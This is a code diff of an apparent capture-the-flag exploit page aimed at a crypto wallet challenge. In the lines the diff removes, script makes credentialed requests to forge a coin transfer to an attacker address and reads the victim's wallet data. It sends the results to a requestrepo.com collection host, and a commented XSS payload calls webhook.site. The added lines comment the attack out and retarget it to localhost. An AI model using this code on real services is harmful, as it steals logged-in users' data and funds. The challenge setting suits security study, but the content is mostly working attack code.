@@ -3,7 +3,7 @@
     <script>        
         //const xssPayload = '\"\u003E\u003Cimg src=x onerror=fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\u003E';
 
-        const win = window.open("https://34.140.37.218:3187/checkout.html?currency=1337COIN&price=1000000", "_blank");
+        const win = window.open("https://127.0.0.1:3187/checkout.html?currency=1337COIN&price=1000000", "_blank");
         const payload = {
         type: "submitTransaction",
         transaction: {
@@ -21,43 +21,43 @@
         }
     }, 2000);
         
-    async function executeAttack() {
-        try {
-            const response = await fetch('https://challenge-0126.intigriti.io/api/transaction', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                credentials: 'include',
-                body: JSON.stringify({
-                    "toAddress": "1afefa17653da6df5ebeb45947b91262d3",
-                    "currency": "1337COIN",
-                    "amount": 1
-                })
-            });
+//     async function executeAttack() {
+//         try {
+//             const response = await fetch('https://127.0.0.1:3187/api/transaction', {
+//                 method: 'POST',
+//                 headers: { 'Content-Type': 'application/json' },
+//                 credentials: 'include',
+//                 body: JSON.stringify({
+//                     "toAddress": "1afefa17653da6df5ebeb45947b91262d3",
+//                     "currency": "1337COIN",
+//                     "amount": 1
+//                 })
+//             });
             
-            const result = await response.json();
+//             const result = await response.json();
             
-            await fetch('https://we6hfxdk.requestrepo.com/?data=' + 
-                       encodeURIComponent(JSON.stringify(result)));
+//             await fetch('https://we6hfxdk.requestrepo.com/?data=' + 
+//                        encodeURIComponent(JSON.stringify(result)));
             
-        } catch (error) {
-            await fetch('https://we6hfxdk.requestrepo.com/?error=' + 
-                       encodeURIComponent(error.message));
-        }
-    }
+//         } catch (error) {
+//             await fetch('https://we6hfxdk.requestrepo.com/?error=' + 
+//                        encodeURIComponent(error.message));
+//         }
+//     }
     
-    executeAttack();      
+//     executeAttack();      
 
-fetch('https://challenge-0126.intigriti.io/api/wallets',  {
-  method: "GET",
-  credentials: "include"
-})
-  .then(response => response.text()) 
-  .then(data => {
-    fetch('https://we6hfxdk.requestrepo.com/?dd=' + encodeURIComponent(data));
-  })
-  .catch(error => {
-    fetch('https://we6hfxdk.requestrepo.com/?error=' + encodeURIComponent(error.message));
-  });
+// fetch('https://challenge-0126.intigriti.io/api/wallets',  {
+//   method: "GET",
+//   credentials: "include"
+// })
+//   .then(response => response.text()) 
+//   .then(data => {
+//     fetch('https://we6hfxdk.requestrepo.com/?dd=' + encodeURIComponent(data));
+//   })
+//   .catch(error => {
+//     fetch('https://we6hfxdk.requestrepo.com/?error=' + encodeURIComponent(error.message));
+//   });
         
     </script>
 </body>
